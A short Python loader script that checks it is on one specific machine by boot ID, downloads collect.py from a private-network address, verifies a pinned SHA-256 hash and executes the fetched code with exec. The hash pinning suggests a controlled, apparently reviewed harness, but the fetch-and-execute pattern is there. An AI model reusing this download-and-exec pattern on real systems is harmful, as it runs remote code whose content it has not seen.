import hashlib,urllib.request
from pathlib import Path
assert Path('/proc/sys/kernel/random/boot_id').read_text().strip()=='b0718166-5c3b-4c4f-b669-4f83d3340d00'
b=urllib.request.urlopen('http://192.168.2.1:8765/collect.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='1d31b72614bdb99d07012ca1c9840d52b28a2e098efe9564063c75bbb7dc7d30'
exec(compile(b,'reviewed_authfix_collection','exec'))
